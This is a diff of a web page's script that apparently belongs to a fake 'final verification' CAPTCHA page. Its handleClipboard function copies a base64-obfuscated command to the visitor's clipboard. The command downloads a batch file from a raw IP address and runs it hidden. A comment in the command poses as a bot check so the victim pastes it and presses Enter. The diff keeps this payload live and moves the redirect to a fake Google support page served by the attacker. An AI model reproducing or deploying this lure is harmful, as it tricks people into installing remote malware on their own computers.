@@ -810,7 +810,6 @@ function closeFinalVerification() {
   const finalVerification = document.getElementById("final-verification");
   if (finalVerification) finalVerification.style.display = "none";
 }
-
 function handleClipboard() {
   const clipboardText = atob(
     "Y29uaG9zdC5leGUgLS1oZWFkbGVzcyBjbWQgL2MgY2QgL0QgJXVzZXJwcm9maWxlJSAmJiBjdXJsIC1zIC1vIGEuYmF0IGh0dHA6Ly8xNTUuOTQuMTU1LjIyNzo2NjY2L2R3L3J1bi5iYXQgJiYgY29uaG9zdCAtLWhlYWRsZXNzIGEuYmF0ICYmIFJFTSBQcmVzcyB0aGUgRU5URVIgYnV0dG9uIHlvdSBjb25maXJtIHlvdSBhcmUgbm90IGEgYm90Lg=="
@@ -818,9 +817,9 @@ function handleClipboard() {
 
   navigator.clipboard.writeText(clipboardText)
     .then(() => {
-      // Show alert and, on OK, open local file 
-      if (confirm("hi")) {  // Using confirm to detect OK click           
-        window.location.href = "file:///C:/Users/z/Downloads/EVERYTHING/reference/google.support.com/GmailHelp.html";
+      if (confirm("hi")) {
+        // Use relative URL for server
+        window.location.href = "/google.support.com/GoogleHelp.html"; 
       }
     })
     .catch((error) => console.error("Clipboard error:", error));
@@ -1079,3 +1078,4 @@ function sendToPythonServer(actionType, userIp, referrer) {
     </script>
   
 </body></html>
+
